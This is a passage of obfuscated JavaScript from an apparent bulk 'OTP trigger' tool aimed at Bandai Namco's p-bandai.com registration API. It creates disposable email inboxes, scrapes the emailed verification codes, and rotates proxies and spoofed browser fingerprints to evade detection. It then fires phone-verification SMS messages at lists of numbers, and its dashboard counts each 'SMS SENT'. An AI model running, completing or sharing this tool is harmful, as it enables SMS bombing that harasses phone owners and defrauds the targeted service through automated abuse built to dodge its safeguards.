  const v182 = v181[Math.floor(Math.random() * v181.length)],
    v183 = Math.floor(Math.random() * (v182.buildMax - v182.buildMin + 0x1)) + v182.buildMin;
  const v184 = Math.floor(Math.random() * 0xc8) + 0x1,
    v185 = Math.random() < 0.3;
  const v186 = !v185 && Math.random() < 0.5;
  let v187, v188, v189;
  if (v185) v187 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v182.v + ".0." + v183 + '.' + v184 + " Safari/537.36", v188 = "\"macOS\"", v189 = "\"10.15.7\"";else v186 ? (v187 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v182.v + ".0." + v183 + '.' + v184 + " Safari/537.36", v188 = "\"Windows\"", v189 = "\"15.0.0\"") : (v187 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v182.v + ".0." + v183 + '.' + v184 + " Safari/537.36", v188 = "\"Windows\"", v189 = "\"10.0.0\"");
  const v190 = {};
  return v190.ua = v187, v190.chUa = "\"Google Chrome\";v=\"" + v182.v + "\", \"Chromium\";v=\"" + v182.v + "\", " + v182.grease, v190.plat = v188, v190.platVer = v189, v190.cv = v182.v, v190;
}
function parsePx(v191) {
  if (!v191) return null;
  if (typeof v191 === "object") return v191;
  v191 = v191.trim();
  if (!v191) return null;
  let v192 = "http";
  (v191.toLowerCase().startsWith("socks5://") || v191.toLowerCase().startsWith("socks4://")) && (v192 = v191.split("://")[0x0].toLowerCase());
  if (v191.includes("://")) v191 = v191.split("://")[0x1];
  let v193, v194, v195, v196;
  if (v191.includes('@')) {
    const v198 = v191.split('@'),
      v199 = v198[0x0].split(':'),
      v200 = v198[0x1].split(':');
    v195 = v199[0x0], v196 = v199[0x1], v193 = v200[0x0], v194 = parseInt(v200[0x1]);
  } else {
    const v201 = v191.split(':');
    if (v201.length === 0x2) v193 = v201[0x0], v194 = parseInt(v201[0x1]);else {
      if (v201.length === 0x4) !isNaN(parseInt(v201[0x3])) && isNaN(parseInt(v201[0x1])) ? (v195 = v201[0x0], v196 = v201[0x1], v193 = v201[0x2], v194 = parseInt(v201[0x3])) : (v193 = v201[0x0], v194 = parseInt(v201[0x1]), v195 = v201[0x2], v196 = v201[0x3]);else v201.length === 0x3 && (v193 = v201[0x0], v194 = parseInt(v201[0x1]), v195 = v201[0x2]);
    }
  }
  if (!v193 || !v194) return null;
  const v197 = {};
  v197.type = v192, v197.host = v193, v197.port = v194, v197.user = v195;
  return v197.pass = v196, v197;
}
function rotateSsid(v202) {
  if (!v202 || !v202.user) return v202;
  const v203 = {
    ...v202
  };
  const v204 = v203,
    v205 = crypto.randomBytes(0x6).toString("base64").replace(/[+/=]/g, '').slice(0x0, 0xa);
  if (v204.user.includes("-ssid-")) v204.user = v204.user.replace(/-ssid-[A-Za-z0-9_]+/, "-ssid-" + v205);else {
    if (v204.user.includes("-session-")) v204.user = v204.user.replace(/-session-[A-Za-z0-9_]+/, "-session-" + v205);else {
      if (/_sid_/i.test(v204.user)) v204.user = v204.user.replace(/_sid_[A-Za-z0-9]+/i, "_sid_" + v205);
    }
  }
  return v204;
}
function mkAgent(v206) {
  if (!v206) return null;
  if (v206.type === "socks5" || v206.type === "socks4") {
    const v208 = v206.user ? encodeURIComponent(v206.user) + ':' + encodeURIComponent(v206.pass || '') + '@' : '';
    return new SocksProxyAgent("socks5://" + v208 + v206.host + ':' + v206.port);
  }
  const v207 = v206.user ? encodeURIComponent(v206.user) + ':' + encodeURIComponent(v206.pass || '') + '@' : '';
  return new HttpsProxyAgent("http://" + v207 + v206.host + ':' + v206.port);
}
function req(v209, v210, v211, v212, v213, v214) {
  v214 = v214 || 0x7530;
  return new Promise((v215, v216) => {
    const v217 = new URL(v209),
      v218 = {
        ...v211
      },
      v219 = v218;
    if (!v219["Accept-Encoding"]) v219["Accept-Encoding"] = "gzip, deflate, br, zstd";
    delete v219["X-Forwarded-For"], delete v219["X-Real-IP"], delete v219.Via, delete v219.Forwarded;
    if (v212) v219["Content-Length"] = Buffer.byteLength(v212);
    const v220 = {};
    v220.hostname = v217.hostname, v220.path = v217.pathname + v217.search, v220.method = v210;
    v220.headers = v219, v220.timeout = v214;
    const v221 = v220;
    if (v213) {
      if (isNaN(v213.port) || v213.port <= 0x0) return v216(new Error("Invalid proxy"));
      v221.agent = mkAgent(v213);
    }
    const v222 = https.request(v221, v223 => {
      const v224 = v223.headers.location;
      if ((v223.statusCode === 0x12d || v223.statusCode === 0x12e || v223.statusCode === 0x12f) && v224) {
        const v226 = {};
        v226.status = v223.statusCode, v226.data = '', v226.headers = v223.headers, v226.redir = v224, v215(v226), v223.resume();
        return;
      }
      const v225 = [];
      v223.on("data", v227 => v225.push(v227)), v223.on("error", v216);
      v223.on("end", () => {
        let v228 = Buffer.concat(v225);
        const v229 = v223.headers["content-encoding"];
        if (v229 === "gzip") try {
          v228 = zlib.gunzipSync(v228);
        } catch (v230) {} else {
          if (v229 === "deflate") try {
            v228 = zlib.inflateSync(v228);
          } catch (v231) {} else {
            if (v229 === 'br') try {
              v228 = zlib.brotliDecompressSync(v228);
            } catch (v232) {}
          }
        }
        v215({
          'status': v223.statusCode,
          'data': v228.toString("utf8"),
          'headers': v223.headers
        });
      });
    });
    v222.on("error", v216), v222.on("timeout", () => {
      v222.destroy(), v216(new Error("timeout"));
    });
    if (v212) v222.write(v212);
    v222.end();
  });
}
class Jar {
  constructor() {
    this.s = {};
  }
  ["set"](v233) {
    if (!v233) return;
    const v234 = Array.isArray(v233) ? v233 : [v233];
    for (const v235 of v234) {
      const v236 = v235.split(';')[0x0].trim(),
        v237 = v236.indexOf('=');
      if (v237 < 0x0) continue;
      this.s[v236.slice(0x0, v237).trim()] = v236.slice(v237 + 0x1).trim();
    }
  }
  ["get"]() {
    return Object.entries(this.s).map(([v238, v239]) => v238 + '=' + v239).join(';\x20');
  }
  ["absorb"](v240) {
    this.set(v240["set-cookie"]);
  }
  ["val"](v241) {
    return this.s[v241] || null;
  }
}
class MailcxQueue {
  constructor(v242 = 0x258) {
    this.intervalMs = v242, this.lastReq = 0x0;
    this.chain = Promise.resolve();
  }
  ["enqueue"](v243) {
    return this.chain = this.chain.then(async () => {
      const v244 = Date.now(),
        v245 = Math.max(0x0, this.lastReq + this.intervalMs - v244);
      if (v245 > 0x0) await new Promise(v246 => setTimeout(v246, v245));
      this.lastReq = Date.now();
      return v243();
    }), this.chain;
  }
}
const mcxQueue = new MailcxQueue(0x258);
let mcxBlockedUntil = 0x0,
  CACHED_MCX_DOMAINS = null;
function rawMcxReq(v247, v248, v249, v250, v251) {
  v249 = v249 || "GET";
  return v251 = v251 || 0x88b8, new Promise((v252, v253) => {
    const v254 = v250 ? JSON.stringify(v250) : null,
      v255 = {};
    v255.Accept = "application/json", v255["x-api-token"] = v248;
    const v256 = v255;
    v254 && (v256["Content-Type"] = "application/json", v256["Content-Length"] = Buffer.byteLength(v254));
    const v257 = {};
    v257.hostname = "api.mail.cx", v257.port = 0x1bb, v257.path = v247, v257.method = v249, v257.headers = v256, v257.timeout = v251;
    const v258 = v257,
      v259 = https.request(v258, v260 => {
        let v261 = '';
        v260.on("data", v262 => v261 += v262);
        v260.on("end", () => {
          try {
            v252({
              'status': v260.statusCode,
              'data': v261 ? JSON.parse(v261) : null
            });
          } catch (v263) {
            const v264 = {};
            v264.status = v260.statusCode, v264.data = null, v252(v264);
          }
        });
      });
    v259.on("error", v265 => v253(new Error("mail.cx: " + v265.message))), v259.on("timeout", () => {
      v259.destroy(), v253(new Error("mail.cx timeout"));
    });
    if (v254) v259.write(v254);
    v259.end();
  });
}
function mcxReq(v266, v267, v268, v269, v270) {
  return mcxQueue.enqueue(() => rawMcxReq(v266, v267, v268, v269, v270));
}
async function mkMcxInbox(v271) {
  if (!CACHED_MCX_DOMAINS || CACHED_MCX_DOMAINS.length === 0x0) {
    const v275 = await mcxReq("/v1/config", v271);
    if (v275.status === 0x1ad) {
      mcxBlockedUntil = Date.now() + 0xea60;
      throw new Error("mail.cx: rate limited (429)");
    }
    const v276 = v275.data && (v275.data.system_domains || v275.data.domains) || [];
    CACHED_MCX_DOMAINS = v276;
  }
  let v272 = Array.isArray(CACHED_MCX_DOMAINS) && CACHED_MCX_DOMAINS.length ? CACHED_MCX_DOMAINS[Math.floor(Math.random() * CACHED_MCX_DOMAINS.length)] : null;
  if (v272 && typeof v272 === "object") v272 = v272.domain || v272.name || Object.values(v272)[0x0];
  if (!v272) throw new Error("mail.cx: no domains");
  const v273 = {};
  v273.length = 0xc;
  const v274 = Array.from(v273, () => "abcdefghijklmnopqrstuvwxyz0123456789"[Math.floor(Math.random() * "abcdefghijklmnopqrstuvwxyz0123456789".length)]).join('');
  return {
    'email': v274 + '@' + v272,
    'provider': "mailcx",
    'token': v271
  };
}
function mtmReq(v277, v278, v279, v280) {
  v278 = v278 || "GET";
  return new Promise((v281, v282) => {
    const v283 = v279 ? JSON.stringify(v279) : null,
      v284 = {};
    v284.Accept = "application/json", v284["Content-Type"] = "application/json";
    const v285 = v284;
    if (v283) v285["Content-Length"] = Buffer.byteLength(v283);
    if (v280) v285.Authorization = "Bearer " + v280;
    const v286 = {};
    v286.hostname = "api.mail.tm";
    v286.port = 0x1bb, v286.path = v277;
    v286.method = v278, v286.headers = v285, v286.timeout = 0x3a98;
    const v287 = v286,
      v288 = https.request(v287, v289 => {
        let v290 = '';
        v289.on("data", v291 => v290 += v291);
        v289.on("end", () => {
          try {
            v281({
              'status': v289.statusCode,
              'data': v290 ? JSON.parse(v290) : {}
            });
          } catch (v292) {
            const v293 = {};
            v293.status = v289.statusCode, v293.data = {}, v281(v293);
          }
        });
      });
    v288.on("error", v294 => v282(new Error("mail.tm: " + v294.message))), v288.on("timeout", () => {
      v288.destroy();
      v282(new Error("mail.tm timeout"));
    });
    if (v283) v288.write(v283);
    v288.end();
  });
}
async function mkMtmInbox() {
  const v295 = await mtmReq("/domains?page=1"),
    v296 = v295.data && v295.data["hydra:member"];
  if (!v296 || !v296.length) throw new Error("mail.tm: no domains");
  const v297 = (v296.find(v307 => v307.isActive && !v307.isPrivate) || v296[0x0]).domain,
    v298 = {};
  v298.length = 0xc;
  const v299 = Array.from(v298, () => "abcdefghijklmnopqrstuvwxyz0123456789"[Math.floor(Math.random() * "abcdefghijklmnopqrstuvwxyz0123456789".length)]).join('');
  const v300 = v299 + '@' + v297,
    v301 = "Temp@" + Math.random().toString(0x24).slice(0x2, 0xa) + "1A!",
    v302 = {};
  v302.address = v300, v302.password = v301;
  const v303 = await mtmReq("/accounts", "POST", v302);
  if (v303.status !== 0xc9) throw new Error("mail.tm: create failed (" + v303.status + ')');
  const v304 = {};
  v304.address = v300;
  v304.password = v301;
  const v305 = await mtmReq("/token", "POST", v304);
  if (!v305.data || !v305.data.token) throw new Error("mail.tm: no token");
  const v306 = {};
  v306.email = v300;
  return v306.provider = "mailtm", v306.token = v305.data.token, v306;
}
async function mkInbox(v308) {
  if (v308 && Date.now() > mcxBlockedUntil) try {
    return await mkMcxInbox(v308);
  } catch (v309) {
    String(v309.message).includes("429") && (mcxBlockedUntil = Date.now() + 0xea60);
  }
  return await mkMtmInbox();
}
async function pollOtp(v310, v311) {
  v311 = v311 || 0x2bf20;
  const v312 = Date.now() + v311,
    v313 = new Set();
  let v314 = '';
  function fn4(v315) {
    if (!v315) return null;
    const v316 = /class=["'][^"']*fs--[sp]*(?:pc|sp)32[^"']*["'][^>]*>\s*(\d{6})\s*</i;
    let v317 = v315.match(v316);
    if (v317) return v317[0x1];
    const v318 = /<(?:td|th|div|span|p|h\d)[^>]*>\s*(\d{6})\s*<\//i;
    v317 = v315.match(v318);
    if (v317) return v317[0x1];
    const v319 = v315.replace(/&amp;/g, '&').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/<[^>]+>/g, '\x20'),
      v320 = /(?:verification|auth(?:entication)?|one[- ]?time|code|pin|passcode|otp|confirm|activate|\u8a8d\u8a3c)[^\d]{0,120}(\d{6})[^\d]/i;
    v317 = v319.match(v320);
    if (v317) return v317[0x1];
    const v321 = /(?:^|\s|:)\s*(\d{6})\s*(?:\s|$)/m;
    v317 = v319.match(v321);
    if (v317) return v317[0x1].trim();
    return null;
  }
  while (Date.now() < v312) {
    await new Promise(v322 => setTimeout(v322, 0x1770));
    try {
      if (v310.provider === "mailcx") {
        const v323 = v314 ? "?since=" + encodeURIComponent(v314) : '',
          v324 = await mcxReq("/v1/inbox/" + encodeURIComponent(v310.email) + (v323 || ''), v310.token, "GET", null, 0x88b8);
        dbg(v310.email, "poll-status", v324.status);
        if (v324.status === 0x1ad) {
          dbg(v310.email, "poll-status-429", "Rate limited by mail.cx, backing off 8s"), await new Promise(v325 => setTimeout(v325, 0x1f40));
          continue;
        }
        if (v324.status === 0xc8 && v324.data && v324.data.emails) {
          if (v324.data.next_since) v314 = v324.data.next_since;
          for (const v326 of v324.data.emails) {
            if (v313.has(v326.id)) continue;
            v313.add(v326.id), dbg(v310.email, "email-subject", v326.subject || ''), dbg(v310.email, "email-preview", (v326.preview_text || '').slice(0x0, 0xc8));
            const v327 = fn4(v326.preview_text || '');
            if (v327) return dbg(v310.email, "otp-from-preview", v327), v327;
            const v328 = await mcxReq("/v1/email/" + v326.id, v310.token),
              v329 = v328.data || {},
              v330 = (v329.html_body || v329.html || '') + (v329.text_body || v329.text || '') + (v329.body || '');
            dbg(v310.email, "email-body", v330.slice(0x0, 0x1f4));
            const v331 = fn4(v330);
            if (v331) return dbg(v310.email, "otp-found", v331), v331;
          }
        }
      } else {
        const v332 = await mtmReq("/messages?page=1", "GET", null, v310.token),
          v333 = v332.data && v332.data["hydra:member"] || [];
        for (const v334 of v333) {
          if (v313.has(v334.id)) continue;
          v313.add(v334.id), dbg(v310.email, "email-subject", v334.subject || '');
          const v335 = await mtmReq("/messages/" + v334.id, "GET", null, v310.token),
            v336 = (v335.data && v335.data.html ? v335.data.html.join('') : '') || v335.data && v335.data.text || '';
          dbg(v310.email, "email-body", v336.slice(0x0, 0x1f4));
          const v337 = fn4(v336);
          if (v337) return dbg(v310.email, "otp-found", v337), v337;
        }
      }
    } catch (v338) {
      dbg(v310.email, "poll-error", v338.message), await new Promise(v339 => setTimeout(v339, 0xbb8));
    }
  }
  throw new Error("OTP timeout (3 min)");
}
let COUNTRY_PREFIXES = [];
const BANDAI_SUPPORTED_ISOS = new Set(),
  BANDAI_COUNTRY_NAMES = new Map(),
  BANDAI_FALLBACK_ISOS = ['AL', 'AS', 'AD', 'AI', 'AG', 'AR', 'AW', 'AU', 'AT', 'BS', 'BH', 'BB', 'BE', 'BZ', 'BM', 'BT', 'BQ', 'BA', 'BW', 'BR', 'VG', 'BN', 'BG', 'CA', 'CV', 'KY', 'CL', 'CN', 'CO', 'KM', 'CK', 'CR', 'HR', 'CW', 'CY', 'CZ', 'DK', 'DM', 'DO', 'EC', 'SV', 'EE', 'FK', 'FO', 'FJ', 'FI', 'FR', 'GF', 'PF', 'DE', 'GI', 'GR', 'GL', 'GD', 'GP', 'GU', 'GT', 'GG', 'GW', 'GY', 'HT', 'HK', 'HU', 'IS', 'IN', 'IE', 'IM', 'IT', 'JP', 'JE', 'KI', 'KR', 'LA', 'LV', 'LI', 'LT', 'LU', 'MO', 'MG', 'MW', 'MY', 'MV', 'MT', 'MH', 'MQ', 'MU', 'YT', 'MX', 'FM', 'MC', 'ME', 'MS', 'NR', 'NL', 'NC', 'NZ', 'NI', 'NU', 'MK', 'MP', 'NO', 'PW', 'PY', 'PE', 'PH', 'PL', 'PT', 'PR', 'RE', 'RO', 'BL', 'KN', 'LC', 'MF', 'PM', 'VC', 'WS', 'SM', 'ST', 'SC', 'SG', 'SX', 'SK', 'SI', 'SB', 'SO', 'ZA', 'ES', 'SH', 'SR', 'SE', 'CH', 'TW', 'TH', 'TO', 'TT', 'TR', 'TM', 'TC', 'TV', 'US', 'AE', 'GB', 'UY', 'VU', 'VA', 'VN', 'VI', 'WF'];
function loadBandaiSupportedCountries() {
  for (const v341 of BANDAI_FALLBACK_ISOS) BANDAI_SUPPORTED_ISOS.add(v341);
  const v340 = path.join(__dirname, "capture", "api");
  if (fs.existsSync(v340)) try {
    const v342 = fs.readFileSync(v340, "utf8"),
      v343 = v342.indexOf("https://p-bandai.com/api/address/countryNumber");
    if (v343 !== -1) {
      const v344 = v342.indexOf("# Response", v343);
      if (v344 !== -1) {
        const v345 = v342.indexOf('[', v344),
          v346 = v342.indexOf("// ================= Request 9 =================", v345);
        if (v345 !== -1 && v346 !== -1) {
          const v347 = v342.substring(v345, v346).trim(),
            v348 = JSON.parse(v347);
          for (const v349 of v348) {
            if (v349 && v349.code) {
              const v350 = v349.code.toUpperCase();
              BANDAI_SUPPORTED_ISOS.add(v350), BANDAI_COUNTRY_NAMES.set(v350, v349.name);
            }
          }
        }
      }
    }
  } catch (v351) {
    dbg("init", "loadBandaiSupportedCountries-err", v351.message);
  }
}
function loadCountryTable() {
  const v352 = [],
    v353 = path.join(__dirname, "country");
  if (fs.existsSync(v353)) try {
    const v354 = fs.readFileSync(v353, "utf8"),
      v355 = v354.split(/\r?\n/);
    for (const v356 of v355) {
      if (!v356.trim() || v356.startsWith('#')) continue;
      const v357 = v356.split('\x09').map(v358 => v358.trim()).filter(Boolean);
      if (v357.length >= 0x4) {
        const v359 = v357[0x1],
          v360 = v357[0x2].toUpperCase(),
          v361 = v357[0x3],
          v362 = v361.split('/');
        for (let v363 of v362) {
          const v364 = v363.replace(/[^0-9]/g, '');
          if (v364) {
            const v365 = {};
            v365.code = v364, v365.iso = v360, v365.country = v359, v352.push(v365);
          }
        }
      }
    }
  } catch (v366) {
    dbg("init", "loadCountryTable-err", v366.message);
  }
  if (v352.length === 0x0) {
    const v367 = {};
    v367["880"] = 'BD', v367['1'] = 'US', v367['44'] = 'GB', v367['33'] = 'FR', v367['49'] = 'DE', v367['39'] = 'IT', v367['34'] = 'ES', v367['31'] = 'NL', v367['32'] = 'BE', v367['46'] = 'SE', v367['47'] = 'NO', v367['45'] = 'DK', v367['41'] = 'CH', v367['43'] = 'AT', v367['48'] = 'PL', v367['61'] = 'AU', v367['81'] = 'JP', v367['82'] = 'KR', v367['86'] = 'CN', v367['91'] = 'IN', v367['55'] = 'BR', v367['52'] = 'MX', v367['54'] = 'AR', v367['57'] = 'CO', v367['56'] = 'CL', v367['51'] = 'PE', v367['63'] = 'PH', v367['62'] = 'ID', v367['60'] = 'MY', v367['65'] = 'SG', v367['66'] = 'TH', v367['84'] = 'VN', v367['92'] = 'PK', v367['20'] = 'EG', v367['90'] = 'TR', v367["234"] = 'NG', v367["254"] = 'KE', v367['27'] = 'ZA', v367["966"] = 'SA', v367["971"] = 'AE', v367["974"] = 'QA', v367["965"] = 'KW', v367["968"] = 'OM', v367["973"] = 'BH';
    const v368 = v367;
    for (const [v369, v370] of Object.entries(v368)) {
      const v371 = {};
      v371.code = v369, v371.iso = v370, v371.country = v370, v352.push(v371);
    }
  }
  return v352.sort((v372, v373) => v373.code.length - v372.code.length), COUNTRY_PREFIXES = v352, v352;
}
loadBandaiSupportedCountries(), loadCountryTable();
function parsePhone(v374) {
  v374 = String(v374 || '').trim();
  let v375 = 'US';
  let v376 = '',
    v377 = "United States";
  if (v374.includes(':') && v374.split(':')[0x0].length === 0x2) {
    const v380 = v374.split(':');
    v375 = v380[0x0].toUpperCase(), v376 = v380[0x1].replace(/[^0-9]/g, ''), v377 = BANDAI_COUNTRY_NAMES.get(v375) || v375;
  } else {
    const v381 = v374.replace(/[^0-9]/g, '');
    let v382 = false;
    for (const v383 of COUNTRY_PREFIXES) {
      if (v381.startsWith(v383.code)) {
        v375 = v383.iso, v376 = v381.slice(v383.code.length), v377 = v383.country, v382 = true;
        break;
      }
    }
    !v382 && (v376 = v381);
  }
  v376 = v376.replace(/^0+/, '');
  const v378 = BANDAI_SUPPORTED_ISOS.size === 0x0 || BANDAI_SUPPORTED_ISOS.has(v375),
    v379 = {};
  v379.countryNo = v375, v379.phoneNo = v376;
  return v379.countryName = v377, v379.supported = v378, v379.unsupportedReason = v378 ? null : "Country not supported by Bandai (" + v377 + '\x20[' + v375 + '])', v379;
}
async function bootstrap(v384, v385) {
  const v386 = new Jar(),
    v387 = {};
  v387.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", v387["Accept-Language"] = "en-US,en;q=0.9";
  v387["User-Agent"] = v385.ua, v387["sec-ch-ua"] = v385.chUa, v387["sec-ch-ua-mobile"] = '?0', v387["sec-ch-ua-platform"] = v385.plat, v387["Sec-Fetch-Dest"] = "document", v387["Sec-Fetch-Mode"] = "navigate", v387["Sec-Fetch-Site"] = "none", v387["Upgrade-Insecure-Requests"] = '1', v387.Priority = "u=0, i";
  const v388 = v387;
  if (v385.platVer) v388["sec-ch-ua-platform-version"] = v385.platVer;
  const v389 = await req('https://p-bandai.com/us/register', "GET", v388, null, v384, 0x7530);
  if (v389.status !== 0xc8) throw new Error("Bootstrap: HTTP " + v389.status);
  v386.absorb(v389.headers);
  let v390 = null;
  const v391 = cheerio.load(v389.data);
  v390 = v391("meta[name=\"csrf-token\"]").attr("content") || v391("meta[name=\"_csrf\"]").attr("content") || null;
  if (!v390) {
    const v393 = v389.data.match(/"?(?:csrf[_-]?token|_csrf|csrfToken)"?\s*[:=]\s*"([A-Za-z0-9_\-.~]{20,120})"/i);
    if (v393) v390 = v393[0x1];
  }
  if (!v390) {
    const v394 = v389.data.match(/window\.__(?:CSRF|csrf)[^=]*=\s*"([A-Za-z0-9_\-.~]{20,120})"/i);
    if (v394) v390 = v394[0x1];
  }
  dbg("session", "bootstrap", {
    'status': v389.status,
    'cookies': Object.keys(v386.s),
    'csrf': !!v390
  });
  if (!v386.val("SESSION")) throw new Error("SESSION cookie missing");
  const v392 = {};
  return v392.jar = v386, v392.csrf = v390, v392;
}
function apiHdrs(v395, v396, v397, v398) {
  const v399 = {};
  v399.Accept = "application/json, text/plain, */*", v399["Accept-Language"] = 'en', v399["Content-Type"] = "application/json", v399["User-Agent"] = v397.ua, v399["sec-ch-ua"] = v397.chUa, v399["sec-ch-ua-mobile"] = '?0';
  v399["sec-ch-ua-platform"] = v397.plat;
  v399["Sec-Fetch-Dest"] = "empty", v399["Sec-Fetch-Mode"] = "cors", v399["Sec-Fetch-Site"] = "same-origin", v399.Origin = "https://p-bandai.com", v399.Priority = "u=1, i", v399["x-requested-with"] = "XMLHttpRequest", v399["x-g1-area-code"] = 'us';
  const v400 = v399;
  if (v397.platVer) v400["sec-ch-ua-platform-version"] = v397.platVer;
  if (v396) v400["x-csrf-token"] = v396;
  if (v398) v400.referer = v398;
  if (v395) v400.cookie = v395.get();
  return v400;
}
async function emailOtp(v401, v402, v403, v404, v405) {
  const v406 = {};
  v406.email = v401, v406.agreeAgeTerms = true;
  const v407 = JSON.stringify(v406),
    v408 = await req("https://p-bandai.com/api/signUp/email/auth", "POST", apiHdrs(v402, v403, v404, 'https://p-bandai.com/us/register'), v407, v405, 0x7530);
  v402.absorb(v408.headers);
  dbg(v401, "email-otp", {
    'status': v408.status,
    'body': v408.data.slice(0x0, 0x96)
  });
  if (v408.status !== 0xc8) {
    if (v408.status === 0x193 || v408.data && v408.data.includes("403")) throw new Error("Session error");
    throw new Error("Session error");
  }
  const v409 = JSON.parse(v408.data);
  if (!v409.authSn) throw new Error("No authSn in response");
  return v409.authSn;
}
async function validateOtp(v410, v411, v412, v413, v414, v415) {
  const v416 = {};
  v416.authCode = v410;
  v416.authSn = v411;
  const v417 = JSON.stringify(v416),
    v418 = await req('https://p-bandai.com/api/signUp/email/validate', "POST", apiHdrs(v412, v413, v414, "https://p-bandai.com/us/register/mailaddress/auth"), v417, v415, 0x7530);
  v412.absorb(v418.headers), dbg("validate", "otp", {
    'status': v418.status,
    'body': v418.data.slice(0x0, 0x96)
  });
  if (v418.status !== 0xc8) throw new Error("Email validate: HTTP " + v418.status);
  const v419 = JSON.parse(v418.data);
  return v419.authResultCode || v419.authSn || 'ok';
}
async function phoneCheck(v420, v421, v422, v423, v424, v425) {
  const v426 = {};
  v426.countryNo = v420, v426.phoneNo = v421;
  const v427 = JSON.stringify(v426),
    v428 = await req('https://p-bandai.com/api/phoneNo', "POST", apiHdrs(v422, v423, v424, 'https://p-bandai.com/us/register/memberregistration'), v427, v425, 0x4e20);
  v422.absorb(v428.headers);
  if (v428.status !== 0xc8) throw new Error("Phone check: HTTP " + v428.status);
  return JSON.parse(v428.data).exists === true;
}
async function phoneOtp(v429, v430, v431, v432, v433, v434) {
  const v435 = {};
  v435.countryNo = v429;
  v435.phoneNo = v430;
  const v436 = {};
  v436.phoneNo = v435;
  const v437 = JSON.stringify(v436),
    v438 = await req("https://p-bandai.com/api/phoneNo/auth", "POST", apiHdrs(v431, v432, v433, "https://p-bandai.com/us/register/memberregistration"), v437, v434, 0x7530);
  v431.absorb(v438.headers), dbg("phone", "otp", {
    'status': v438.status,
    'body': v438.data.slice(0x0, 0x96)
  });
  if (v438.status !== 0xc8 && v438.status !== 0xc9) {
    if (v438.data && (v438.data.includes("403") || v438.data.includes("FORBIDDEN"))) throw new Error("Session error");
    if (v438.data && v438.data.includes("about:blank")) throw new Error("Invalid request / Unsupported number");
    throw new Error("Session error");
  }
  return JSON.parse(v438.data);
}
async function createVerifiedSession(v439 = {}) {
  const {
      proxy = null,
      mcxKey = '',
      onStatus = () => {}
    } = v439,
    v440 = getRandomClient(),
    v441 = proxy ? rotateSsid(proxy) : null;
  onStatus("[1/4] Creating inbox...");
  const v442 = await mkInbox(mcxKey);
  onStatus("[2/4] Bootstrapping session...");
  const v443 = await bootstrap(v441, v440);
  const v444 = v443.jar,
    v445 = v443.csrf;
  onStatus("[3/4] Email OTP -> " + v442.email + "...");
  const v446 = await emailOtp(v442.email, v444, v445, v440, v441);
  onStatus("[4/4] Waiting email OTP...");
  const v447 = await pollOtp(v442, 0x2bf20);
  onStatus("[4/4] Validating email OTP..."), await validateOtp(v447, v446, v444, v445, v440, v441);
  return dbg(v442.email, "session-verified-ready", {
    'email': v442.email,
    'proxy': v441 ? v441.type + "://" + v441.host + ':' + v441.port : "DIRECT"
  }), {
    'email': v442.email,
    'jar': v444,
    'csrf': v445,
    'cl': v440,
    'px': v441,
    'otpCount': 0x0,
    'createdAt': Date.now()
  };
}
class Dashboard {
  constructor(v448) {
    {
      this.totalNumbers = v448;
      this.processed = 0x0;
      this.successful = 0x0;
      this.failed = 0x0;
      this.startTime = Date.now();
      this.maxOtpsPerSession = 0x0;
    }
  }
  ["addLog"](v449, v450) {
    let v451 = '';
    if (v450 === "success") v451 = chalk.hex("#00C9A7").bold(" ✦ NOT REXY") + chalk.hex("#555555")(" │ ") + chalk.hex("#00C9A7")("OTP Sent") + chalk.hex("#555555")(" → ") + chalk.hex("#FFD700").bold(v449.replace("Triggered OTP for ", '').replace("SMS SENT → ", ''));else {
      if (v450 === "retry") v451 = chalk.hex("#FFD700").bold(" ↻ NOT REXY") + chalk.hex("#555555")(" │ ") + chalk.hex("#FFD700")(v449);else {
        const v452 = v449.match(/\+?\d{7,}/),
          v453 = v452 ? v452[0x0] : '',
          v454 = v449.replace(/Failed on \S+: /, '').replace(/Fatal error on \S+: /, '');
        v451 = chalk.hex("#FF4466").bold(" ✗ NOT REXY") + chalk.hex("#555555")(" │ ") + chalk.hex("#FF4466")(v453 ? '' + v453 : '') + chalk.hex("#555555")(v453 ? " → " : '') + chalk.hex("#888888")(v454);
      }
    }
    process.stdout.write("\r[K" + v451 + '\x0a'), this.render();
  }
  ["setStatus"](v455) {}
  ["update"]() {}
  ["render"]() {
    const v456 = this.processed / Math.max(this.totalNumbers, 0x1);
    const v457 = (v456 * 0x64).toFixed(0x1),
      v458 = Math.round(v456 * 0x14),
      v459 = 0x14 - v458,
      v460 = chalk.hex("#00C9A7")('█'.repeat(v458)) + chalk.hex("#333333")('░'.repeat(v459)),
      v461 = '\x20\x20' + chalk.hex("#00C9A7").bold("NOT REXY") + chalk.hex("#555555")(" ⮞ ") + v460 + chalk.hex("#888888")('\x20' + v457 + '%') + chalk.hex("#555555")("  │  ") + chalk.hex("#00C9A7").bold('✓\x20' + this.successful) + chalk.hex("#555555")('\x20\x20') + chalk.hex("#FF4466").bold('✗\x20' + this.failed) + chalk.hex("#555555")("  [" + this.processed + '/' + this.totalNumbers + ']');
    process.stdout.write("\r[K" + v461);
  }
  ["stop"]() {
    process.stdout.write("[2K\r\n");
    const v462 = Math.floor((Date.now() - this.startTime) / 0x3e8);
    const v463 = Math.floor(v462 / 0x3c),
      v464 = v462 % 0x3c;
    const v465 = v463 + 'm\x20' + v464 + 's';
    console.log(C("  ╔════════════════════════════════════════════╗")), console.log(C("  ║") + W.bold("  BANDAI NAMCO OTP TRIGGER — COMPLETE         ") + C('║')), console.log(C("  ╠════════════════════════════════════════════╣")), console.log(C("  ║") + ('\x20\x20' + chalk.greenBright("Successful") + "   " + chalk.greenBright(String(this.successful).padStart(0x6)) + "                       ") + C('║')), console.log(C("  ║") + ('\x20\x20' + chalk.red("Failed") + "       " + chalk.red(String(this.failed).padStart(0x6)) + "                       ") + C('║'));
    this.maxOtpsPerSession > 0x0 && console.log(C("  ║") + ('\x20\x20' + chalk.yellow("Max OTP/Mail") + '\x20' + chalk.yellow(String(this.maxOtpsPerSession).padStart(0x6)) + "                       ") + C('║')), console.log(C("  ║") + ('\x20\x20' + chalk.cyan("Total Time") + "   " + chalk.cyan(v465.padEnd(0x6)) + "                       ") + C('║')), console.log(C("  ╚════════════════════════════════════════════╝\n"));
  }
}
